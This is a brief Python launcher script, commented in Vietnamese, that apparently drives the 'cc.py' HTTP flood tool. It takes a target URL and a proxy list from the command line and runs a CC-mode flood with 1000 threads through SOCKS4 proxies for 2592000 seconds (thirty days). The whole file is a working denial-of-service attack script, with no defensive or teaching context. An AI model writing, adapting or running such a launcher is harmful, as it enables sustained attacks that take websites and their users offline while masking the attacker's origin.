import os
import sys

# Lấy các tham số từ file chính
SETURL = sys.argv[1]
PROXY = sys.argv[2]
VERIFY = sys.argv[3]

# Xóa file `socks4.txt` nếu tồn tại
if os.path.exists("../socks4.txt"):
    os.remove("../socks4.txt")

# Chạy lệnh tương đương với file .bat
os.chdir("..")
os.system(f"python cc.py -url {SETURL} -m cc -v 4 -t 1000 -f {PROXY}socks4.txt -b 1 -s 2592000 {VERIFY}")
